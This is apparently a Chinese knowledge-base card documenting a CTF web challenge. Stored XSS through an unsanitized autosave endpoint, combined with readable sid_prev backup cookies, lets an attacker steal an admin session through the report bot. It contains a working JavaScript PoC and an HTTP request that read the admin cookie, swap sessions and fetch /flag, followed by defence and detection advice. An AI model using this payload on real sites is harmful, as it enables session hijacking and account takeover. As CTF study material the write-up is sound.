---
id: ctf-web-autosave-xss-sid-prev-backup-cookie-admin-session
title: 未净化 autosave 草稿存储型 XSS + 非 httpOnly 会话与 sid_prev 备份 cookie 窃取管理员会话
type: scenario
domain: ctf
path: ctf/web
technique: autosave-xss-sid-prev-backup-cookie-hijack
tags:
- ctf
- web
- xss
- stored-xss
- session
- cookie
- sid-prev
- bot
- dompurify-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:58:45+08:00'
  notes: 已对照原文与图01核对：/api/save 走 sanitizeHtml 而 /api/autosave 原样写 draftContent、编辑页非转义渲染、cookieOptions httpOnly:false、/magic/:token 把旧 sid 复制到 sid_prev、resolveSession 只看 sid、/flag 只查 isAdmin、report 相对路径用 APP_ORIGIN 补全；exp 链 autosave XSS→magic→report→读 sid_prev→换 sid→fetch /flag→写回文章均与原文一致。图01 显示取得 uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}。无 sources/source_url；技术卡无产品版本。未在本机复跑。
url: /docs/ctf/web/ctf-web-autosave-xss-sid-prev-backup-cookie-admin-session/
draft: false
kb_aliases:
- Personal Blog
- UofTCTF Personal Blog
- autosave 存储型 XSS
- sid_prev cookie
- magic link 备份旧会话
- 报告 bot 相对路径
---

## 一句话结论

博客的 `/api/save` 用 DOMPurify 净化内容，但 `/api/autosave` 把 `draftContent` 原样入库，编辑页又非转义渲染草稿，形成稳定存储型 XSS；Cookie 设置为 `httpOnly:false`，且 magic link 在已登录时会把旧 `sid` 复制到可读的 `sid_prev` 再发新 `sid`——让 admin bot 访问该 magic link 后，XSS 读取 `sid_prev` 即得 admin 会话，替换 `sid` 后 `fetch('/flag')` 并把结果写回文章。

## 原理

- **双端点净化不一致**：`/api/save` 对 `content` 调用 `sanitizeHtml(rawContent)`（DOMPurify）后写入 `savedContent`/`draftContent`；`/api/autosave` 直接把 `req.body.content` 赋给 `draftContent`，没有净化。编辑页从 `draftContent` 非转义输出，故 autosave 是 XSS 注入点。
- **Cookie 可被 JS 读取**：`cookieOptions()` 返回 `{ httpOnly: false, sameSite: 'Lax', path: '/' }`，`sid`/`sid_prev` 都能被 `document.cookie` 读取；SameSite Lax 不阻止同源 XSS 读取。
- **sid_prev 备份旧会话**：`GET /magic/:token` 中，若请求带 `sid`，先把现有 `sid` 写入 `sid_prev` cookie，再创建新会话并设置新 `sid`。admin bot 先登录（带 admin `sid`）再访问 magic link，于是 `sid_prev = admin sid`。
- **会话解析只看 sid**：`resolveSession()` 只读 `req.cookies.sid` 查 `db.sessions`，`/flag` 只校验 `req.user.isAdmin`；把浏览器 `sid` 换成 admin `sid` 即可通过。
- **bot 与相对路径**：`/report` 的 `normalizeReportUrl()` 对以 `/` 开头的输入用 `APP_ORIGIN` 补全并强制 `url.host = appOrigin.host`；若提交绝对地址 `http://127.0.0.1:3000/...` 而 bot 登录在 `localhost:3000`，会出现不同源/无 admin sid 的问题。提交相对路径 `/magic/<token>?redirect=/edit/<post_id>` 保证 bot 在同源会话下访问。
- **完整链**：普通用户注册 → 创建文章得 `post_id` → `/api/autosave` 写入 XSS → 生成自己的 magic token → `/report` 提交相对路径 magic link → bot 以 admin 登录后访问 → 服务端复制 admin sid 到 `sid_prev` 并重定向到编辑页 → XSS 读 `sid_prev`、替换 `sid`、`fetch('/flag')` → 把 flag 写回文章 → 攻击者读取文章。

## 触发条件

- 应用存在“净化端点/未净化端点”写入同一字段，且该字段在页面非转义渲染。
- 会话 cookie `httpOnly=false`，且存在把旧 sid 写入客户端可读 cookie 的逻辑（`sid_prev`）。
- bot 以管理员身份登录后访问用户提交的 URL；`/flag` 仅按当前 `sid` 判权。
- 报告 URL 允许相对路径并按应用 origin 补全（或可绕过 host 归一化）。

## 利用步骤

1. 注册普通账号并登录，创建/进入编辑页获得 `post_id`。
2. 向 `/api/autosave` POST `{"postId":<id>,"content":"<script>...</script>"}`，把 XSS 写入 `draftContent`。
3. 生成自己的 magic token（`/magic/generate`，从 `/account` 页面提取 `/magic/<token>`）。
4. 向 `/report` 提交相对 URL `/magic/<token>?redirect=/edit/<post_id>`；bot 先以 admin 登录，再访问该 URL。
5. XSS 执行：等待重定向到编辑页后读取 `document.cookie` 中的 `sid_prev`，设置 `sid=<admin sid>`，`fetch('/flag')`，再恢复自己的 sid，把 flag 通过 `/api/save` 写入文章。
6. 打开 `/post/<post_id>` 读取 flag。

## PoC

```javascript
// autosave 注入的 XSS（简化）
(async () => {
  await new Promise(r => setTimeout(r, 2000));
  const m = document.cookie.match(/sid_prev=([a-zA-Z0-9]+)/);
  if (!m) return;
  const adminSid = m[1];
  const cur = document.cookie.match(/sid=([a-zA-Z0-9]+)/);
  const mySid = cur ? cur[1] : '';
  document.cookie = 'sid=' + adminSid + '; path=/';
  const flag = await (await fetch('/flag')).text();
  if (mySid) document.cookie = 'sid=' + mySid + '; path=/';
  await fetch('/api/save', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({postId: POST_ID, content: '<h1>WIN: ' + flag + '</h1>'})
  });
})();
```

```http
POST /api/autosave HTTP/1.1
Content-Type: application/json

{"postId":123,"content":"<script>/* 上述 JS */</script>"}
```

## 变体与关联

- **无 sid_prev 时**：若 bot 未先登录或 magic link 不带旧 sid，可改为直接读 `document.cookie` 的 `sid`（httpOnly=false 时当前会话本身可读），或利用其他会复制旧会话的接口。
- **绝对 URL 陷阱**：report 绝对地址可能导致 bot 访问不同 host，magic link 不带 admin sid，`sid_prev` 不设置；优先使用相对路径。
- **净化器绕过**：其他“保存时净化、自动保存/预览/导入时不净化”的端点同样可造成存储型 XSS；DOMPurify 版本漏洞见本库 mXSS 卡片。
- **关联**：`web-generic-xss-backend-script-style-blacklist-api-bypass`（直连接口绕过前端净化）、`ctf-web-bot-jku-csp-crlf-cookie-hijack-chain`（另一条 bot/cookie 窃取链）。
- **边界**：Cookie 若为 httpOnly、sid_prev 不落客户端、编辑页转义输出、bot 不使用同源会话或报告 URL 强制绝对地址时，链路受阻。

## 检测与防御

- **XSS 侧**：所有写入 `draftContent` 的端点统一净化；渲染时转义（不要用 `innerHTML` 直接输出草稿）；对富文本使用 DOMPurify 且保持版本更新。
- **会话侧**：session cookie 设置 `httpOnly: true`、`Secure`、`SameSite=Lax/Strict`；不要把旧 sid 写入客户端可读 cookie；会话轮换时在服务端作废旧 sid，而不是备份给客户端。
- **bot 侧**：报告 URL 限制同源、拒绝相对路径歧义；bot 访问用户 URL 时不携带高权限会话（用隔离会话/一次性 token）；对 `/flag` 增加二次校验。
- **检测**：`/api/autosave` 请求体含 `<script`/事件处理器；同一账号 autosave 后紧接着 magic/report 请求；admin 会话在短时间内从不同 sid 访问 `/flag`；`sid_prev` cookie 出现在日志中。
